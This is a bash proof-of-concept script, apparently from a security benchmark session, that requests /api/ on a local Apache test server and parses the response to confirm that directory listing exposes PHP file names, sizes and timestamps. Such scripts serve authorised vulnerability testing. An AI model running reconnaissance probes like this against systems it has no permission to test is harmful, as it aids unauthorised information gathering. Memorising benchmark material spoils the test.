#!/bin/bash
# POC: Demonstrates directory listing vulnerability on /api/ endpoint exposing all PHP API files with metadata
# Target: ./repo
# Created: 2025-11-07T17:47:56.492Z
# Session: benchmark-XBEN-069-24-mhp4ra0s

# Directory Listing Vulnerability POC
# Demonstrates Apache directory listing on /api/ endpoint

TARGET_URL="http://localhost:8080/api/"

echo "=========================================="
echo "Directory Listing Vulnerability POC"
echo "=========================================="
echo ""
echo "Target: $TARGET_URL"
echo ""

# Make request to /api/ directory
echo "[*] Sending request to /api/ directory..."
RESPONSE=$(curl -s -i "$TARGET_URL")

echo "[*] Analyzing response..."
echo ""

# Extract status code
STATUS_CODE=$(echo "$RESPONSE" | head -n 1)
echo "Status Line: $STATUS_CODE"
echo ""

# Check if directory listing is enabled (HTTP 200 response with HTML content-type)
if echo "$RESPONSE" | grep -q "200 OK"; then
    echo "[+] Server returned HTTP 200 OK"
    
    if echo "$RESPONSE" | grep -iq "Content-Type: text/html"; then
        echo "[+] Response is HTML content (text/html)"
        
        # Extract the body
        BODY=$(echo "$RESPONSE" | sed -n '/<html/,/<\/html>/p')
        
        if [ -n "$BODY" ]; then
            echo "[+] HTML body detected - directory listing appears to be enabled"
            echo ""
            echo "[*] Extracting exposed API files from directory listing..."
            echo ""
            
            # Look for PHP files in the response
            if echo "$BODY" | grep -q "\.php"; then
                echo "[VULNERABLE] PHP files detected in directory listing:"
                echo "$BODY" | grep -oP 'href="[^"]*\.php"' | sed 's/href="//;s/"//' | while read file; do
                    echo "  - $file"
                done
                echo ""
                
                # Look for file size and timestamp information
                if echo "$BODY" | grep -q "bytes\|K\|M"; then
                    echo "[VULNERABLE] File metadata (sizes) visible in directory listing"
                fi
                
                if echo "$BODY" | grep -qE '[0-9]{4}-[0-9]{2}-[0-9]{2}'; then
                    echo "[VULNERABLE] File timestamps visible in directory listing"
                fi
                echo ""
                echo "[!] VULNERABILITY CONFIRMED: Directory listing is enabled on /api/"
                echo "[!] Impact: Complete API structure exposed, enabling information disclosure"
                exit 0
            else
                echo "[-] No PHP files found in response"
                exit 1
            fi
        else
            echo "[-] Could not extract HTML body from response"
            exit 1
        fi
    else
        echo "[-] Response is not HTML (directory listing disabled)"
        exit 1
    fi
else
    echo "[-] Server did not return HTTP 200"
    exit 1
fi